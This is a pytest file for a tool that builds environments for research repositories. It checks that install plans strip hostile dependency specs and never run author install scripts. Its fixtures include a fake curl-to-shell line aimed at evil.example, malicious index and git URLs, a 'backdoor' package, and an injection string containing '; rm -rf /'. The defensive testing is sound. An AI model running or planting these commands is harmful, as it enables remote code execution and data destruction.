"""The install phase is the one stage with network egress, so what it is asked to
run is the security surface of environment building.

The property under test: for a repository written to abuse it, the PLAN contains
no author-controlled execution and nothing that points the phase at a server the
author chose — and every command that is there says who asked for it, so a
failure is attributed to the right side. Plans are pure, so none of this needs a
daemon; the base64-embedding mechanism is also exercised through a real shell."""

from __future__ import annotations

import base64
import json
import re
import shutil
import subprocess

import pytest
import yaml

from reprobe.config import load_config
from reprobe.envbuild import plan as plan_env
from reprobe.envbuild import sanitize as Z
from reprobe.envbuild.base import AUTHOR, DETECTED, RECORD
from reprobe.models import DetectResult

_EMBED = re.compile(r"printf %s '([A-Za-z0-9+/=]*)' \| base64 -d > (\S+)")


def _embedded(cmds: list[str]) -> dict[str, str]:
    """{path: decoded content} for every file the plan writes into the container."""
    out = {}
    for c in cmds:
        for b64, dest in _EMBED.findall(c):
            out[dest] = base64.b64decode(b64).decode("utf-8")
    return out


def _plan(tmp_path, files: dict[str, str], *, types=("python", "r"), meta=None, **det):
    for rel, text in files.items():
        f = tmp_path / rel
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(text, encoding="utf-8")
    d = DetectResult(artifact_types=list(types), steps=[], **det)
    return plan_env(d, meta or {}, load_config(), tmp_path)


HOSTILE = {
    "requirements.txt": ("pandas>=2\n-e .\ngit+https://evil.example/x.git\n"
                         "pkg @ https://evil.example/pkg.whl\n--index-url https://evil.example/simple\n"),
    "environment.yml": yaml.safe_dump({
        "channels": ["https://evil.example/chan", "someuser", "conda-forge"],
        "dependencies": ["numpy", "evil::backdoor", "https://evil.example/x.conda",
                         {"pip": ["scipy==1.11", "-e .", "git+https://evil.example/y.git"]}]}),
    "renv.lock": json.dumps({"Packages": {
        "dplyr": {"Package": "dplyr", "Source": "Repository", "Repository": "CRAN"},
        "backdoor": {"Package": "backdoor", "Source": "GitHub", "RemoteUsername": "evil"}}}),
    "install.R": 'install.packages(c("lme4", "emmeans"))\nsystem("curl http://evil.example | sh")\n',
    ".Rprofile": 'system("curl http://evil.example | sh")\n',
}


# --------------------------------------------------------------------------- #
# The plan for a repository written to abuse the install phase
# --------------------------------------------------------------------------- #

@pytest.fixture()
def hostile_plan(tmp_path):
    return _plan(tmp_path, HOSTILE, types=("python", "r", "jupyter"),
                 py_packages=["shap"], r_packages=["lme4"])


def test_the_authors_install_script_is_never_executed(hostile_plan):
    joined = "\n".join(hostile_plan.install_commands)
    assert "install.R" not in joined
    assert "curl" not in joined and "evil.example" not in re.sub(r"'[A-Za-z0-9+/=]+'", "", joined)
    assert any("install.R was NOT executed" in w for w in hostile_plan.warnings)


def test_its_install_lists_are_still_honoured_from_the_pinned_snapshot(tmp_path):
    from reprobe.detect import signatures
    (tmp_path / "install.R").write_text('install.packages(c("lme4", "emmeans"))\n', encoding="utf-8")
    (tmp_path / "analysis.R").write_text("x <- 1\n", encoding="utf-8")
    det = signatures.scan(tmp_path)
    p = plan_env(det, {}, load_config(), tmp_path)
    cran = [c for c in p.install_commands if "install.packages(ok" in c]
    assert cran and '"lme4"' in cran[0] and '"emmeans"' in cran[0]
    assert "packagemanager.posit.co" in cran[0]


def test_every_harness_python_runs_isolated_and_every_rscript_vanilla(hostile_plan):
    """`python -I` keeps the artifact's directory and PYTHONPATH off sys.path (a
    committed pip.py or sitecustomize.py is never imported by the networked
    process); `--vanilla` skips the artifact's .Rprofile/.Renviron."""
    bad = []
    for c in hostile_plan.install_commands:
        # a pip that is not `python -I -m pip`, or a python without -I
        for m in re.finditer(r"(?<![\w./-])pip3?\s+(install|freeze|download|list)\b", c):
            if not c[:m.start()].endswith("-m "):
                bad.append(c[m.start():m.start() + 40])
        for m in re.finditer(r"(?<![\w./-])python3?\s+(?!-I\b)", c):
            bad.append(c[m.start():m.start() + 40])
        for m in re.finditer(r"/bin/python\s+(?!-I\b)", c):
            bad.append(c[m.start():m.start() + 40])
        for m in re.finditer(r"(?<![\w./-])Rscript\s+(?!--vanilla\b)", c):
            bad.append(c[m.start():m.start() + 40])
    assert not bad, bad


def test_micromamba_never_reads_the_artifacts_home(hostile_plan):
    mm = [c for c in hostile_plan.install_commands if "micromamba" in c]
    assert mm
    for c in mm:
        for m in re.finditer(r"micromamba (create|install|list)", c):
            assert c[:m.start()].rstrip().endswith("HOME=/var/tmp/reprobe-home"), c[:m.start() + 30]


def test_the_sanitised_requirements_are_what_pip_reads(hostile_plan):
    files = _embedded(hostile_plan.install_commands)
    req = files["/work/.reprobe_req/requirements.txt"]
    assert "pandas>=2" in req
    for bad in ("-e", "git+", "evil.example", "--index-url", "@"):
        assert bad not in req, bad
    cmd = next(c for c in hostile_plan.install_commands if "-r /work/.reprobe_req/requirements.txt" in c)
    assert "requirements.txt " not in cmd.replace("/work/.reprobe_req/requirements.txt", "")  # not the author's
    assert any("were NOT applied" in w and "requirements.txt" in w for w in hostile_plan.warnings)


def test_the_conda_environment_is_rebuilt_from_a_sanitised_copy(hostile_plan):
    spec = yaml.safe_load(_embedded(hostile_plan.install_commands)["/work/.reprobe_req/environment.yml"])
    assert spec["channels"] == ["conda-forge"]
    deps = [d for d in spec["dependencies"] if isinstance(d, str)]
    assert deps == ["numpy"]
    assert spec["dependencies"][-1] == {"pip": ["scipy==1.11"]}
    create = next(c for c in hostile_plan.install_commands if "micromamba create" in c)
    assert "-f /work/.reprobe_req/environment.yml" in create
    assert not re.search(r"-f\s+environment\.yml", create)          # never the author's file
    assert hostile_plan.conda_env_prefix == "/work/.reprobe_env"
    assert any("environment.yml" in w and "were NOT applied" in w for w in hostile_plan.warnings)


def test_renv_restores_from_the_pinned_snapshot_minus_non_cran_sources(tmp_path):
    p = _plan(tmp_path, {"renv.lock": HOSTILE["renv.lock"]}, types=("r",))
    restore = next(c for c in p.install_commands if "renv::restore" in c)
    assert restore.startswith("Rscript --vanilla -e ")
    assert 'exclude=c("backdoor")' in restore and "packagemanager.posit.co" in restore
    assert any("backdoor" in w and "were NOT applied" in w for w in p.warnings)


def test_an_unparseable_lockfile_is_not_restored_as_written(tmp_path):
    p = _plan(tmp_path, {"renv.lock": "{ not json"}, types=("r",))
    assert not any("renv::restore" in c for c in p.install_commands)
    assert any("could not be parsed" in w for w in p.warnings)


def test_detected_python_packages_install_as_wheels_only_and_isolated(tmp_path):
    p = _plan(tmp_path, {}, types=("python",), py_packages=["shap", "umap-learn"])
    cmd = next(c for c in p.install_commands if "reprobe: imports the environment" in c)
    assert cmd.startswith("python -I -c '")
    # wheels only: an unregistered, squatted name runs no code while the network is open
    assert "--only-binary=:all:" in cmd and '"-I", "-m", "pip"' in cmd
    code = cmd[len("python -I -c '"):-1]
    assert "'" not in code                       # nothing can close the shell quote
    compile(code, "<install>", "exec")           # and it is valid Python
    # earlier installs are visible again after -I dropped PYTHONPATH
    assert 'sys.path.append("/work/.reprobe_deps")' in code
    assert any("wheels only" in w for w in p.warnings)


# --------------------------------------------------------------------------- #
# Attribution: who asked for each command
# --------------------------------------------------------------------------- #

def test_every_command_carries_an_origin(hostile_plan):
    assert len(hostile_plan.install_origins) == len(hostile_plan.install_commands)
    assert set(hostile_plan.install_origins) <= {AUTHOR, DETECTED, RECORD}


def test_origins_say_who_asked(hostile_plan):
    by = dict(zip(hostile_plan.install_commands, hostile_plan.install_origins, strict=True))
    for c, o in by.items():
        if "requirements.txt" in c and "pip install" in c:
            assert o == AUTHOR
        if "micromamba create" in c or "renv::restore" in c:
            assert o == AUTHOR
        if "reprobe: imports the environment" in c:
            assert o == DETECTED
        if "pip freeze" in c or "installed.packages()[, c(" in c and "install.packages" not in c \
                or "micromamba list" in c:
            assert o == RECORD


def test_a_manifest_r_package_is_the_authors_and_a_scanned_one_is_ours(tmp_path):
    p = _plan(tmp_path, {}, types=("r",), r_packages=["lme4", "brms"],
              meta={"environment": {"r_packages": ["brms"]}})
    by = {c: o for c, o in zip(p.install_commands, p.install_origins, strict=True)
          if "install.packages(ok" in c}
    declared = [o for c, o in by.items() if '"brms"' in c]
    scanned = [o for c, o in by.items() if '"lme4"' in c]
    assert declared == [AUTHOR] and scanned == [DETECTED]


# --------------------------------------------------------------------------- #
# repo2docker is not claimed unless it ran
# --------------------------------------------------------------------------- #

def test_allow_repo2docker_does_not_claim_a_builder_that_did_not_run(tmp_path):
    (tmp_path / "apt.txt").write_text("libfoo\n", encoding="utf-8")
    d = DetectResult(artifact_types=["python"], flags=["needs-repo2docker"], steps=[])
    p = plan_env(d, {}, load_config(), tmp_path, allow_repo2docker=True)
    assert p.strategy != "repo2docker" and p.env_provenance != "repo2docker-built"
    assert p.repo2docker_version is None
    assert any("no repo2docker builder" in w for w in p.warnings)


# --------------------------------------------------------------------------- #
# The embedding mechanism, through a real shell
# --------------------------------------------------------------------------- #

@pytest.mark.skipif(shutil.which("bash") is None or shutil.which("base64") is None,
                    reason="needs bash and base64")
def test_embedded_content_round_trips_through_a_shell_unchanged(tmp_path):
    nasty = "a'b\"c\n$(touch pwned)\n`touch pwned2`\n; rm -rf /\n\\n\n"
    dest = (tmp_path / "out" / "r.txt").as_posix()
    r = subprocess.run(["bash", "-c", Z.embed_file_command(nasty, dest)],
                       capture_output=True, text=True, cwd=tmp_path)
    assert r.returncode == 0, r.stderr
    assert (tmp_path / "out" / "r.txt").read_text(encoding="utf-8") == nasty
    assert not (tmp_path / "pwned").exists() and not (tmp_path / "pwned2").exists()


# --------------------------------------------------------------------------- #
# sanitize.py directly
# --------------------------------------------------------------------------- #

@pytest.mark.parametrize("line, kept", [
    ("pandas>=2.0", True),
    ('scipy[extra]==1.11 ; python_version >= "3.9"', True),
    ("requests==2.31 --hash=sha256:aaaa", True),
    ("-e .", False), ("--editable git+https://x/y.git#egg=y", False),
    ("git+https://x/y.git", False), ("hg+https://x/y", False),
    ("pkg @ https://x/pkg.whl", False), ("https://x/pkg.whl", False),
    ("./local", False), ("../up", False), ("/abs/pkg", False), ("pkg-1.0.tar.gz", False),
    ("--index-url https://x/simple", False), ("--extra-index-url=https://x", False),
    ("-i https://x", False), ("--find-links /tmp", False), ("--trusted-host x", False),
    ("torch==2 --global-option=--build-lib", False),
    ("not a requirement", False),
])
def test_requirement_lines_are_kept_or_dropped_for_a_reason(line, kept):
    k, d = Z.filter_requirement_lines([line])
    assert bool(k) is kept and bool(d) is not kept
    if d:
        assert d[0][1]                                   # every drop carries its reason


def test_includes_are_inlined_inside_the_repo_and_refused_outside(tmp_path):
    (tmp_path / "base.txt").write_text("numpy==1.26\n", encoding="utf-8")
    (tmp_path / "requirements.txt").write_text(
        "pandas\n-r base.txt\n-r ../outside.txt\n-c constraints.txt\n", encoding="utf-8")
    k, d = Z.filter_requirements(tmp_path / "requirements.txt", tmp_path)
    assert k == ["pandas", "numpy==1.26"]
    assert {x[0] for x in d} == {"-r ../outside.txt", "-c constraints.txt"}


def test_include_cycles_terminate(tmp_path):
    (tmp_path / "a.txt").write_text("pandas\n-r b.txt\n", encoding="utf-8")
    (tmp_path / "b.txt").write_text("numpy\n-r a.txt\n", encoding="utf-8")
    k, _ = Z.filter_requirements(tmp_path / "a.txt", tmp_path)
    assert k == ["pandas", "numpy"]


def test_conda_specs_that_name_a_url_path_or_foreign_channel_are_dropped():
    clean, dropped = Z.sanitize_conda_env({
        "channels": ["conda-forge", "defaults", "someuser"],
        "dependencies": ["python=3.11", "conda-forge::scipy", "evil::pkg", "./local",
                         "https://x/y.conda", "pkg.tar.bz2"]})
    assert clean["channels"] == ["conda-forge", "defaults"]
    assert clean["dependencies"] == ["python=3.11", "conda-forge::scipy"]
    assert len(dropped) == 5


def test_a_conda_file_with_no_allowed_channel_falls_back_to_conda_forge():
    clean, _ = Z.sanitize_conda_env({"channels": ["https://evil/x"], "dependencies": ["numpy"]})
    assert clean["channels"] == ["conda-forge"]


def test_the_channel_allow_list_is_configuration_not_code(tmp_path):
    cfg = load_config()
    cfg.pins.setdefault("install", {})["conda_channels"] = ["conda-forge", "my-lab-channel"]
    (tmp_path / "environment.yml").write_text(
        yaml.safe_dump({"channels": ["my-lab-channel", "bioconda"], "dependencies": ["numpy"]}),
        encoding="utf-8")
    p = plan_env(DetectResult(artifact_types=["python"], steps=[]), {}, cfg, tmp_path)
    spec = yaml.safe_load(_embedded(p.install_commands)["/work/.reprobe_req/environment.yml"])
    assert spec["channels"] == ["my-lab-channel"]
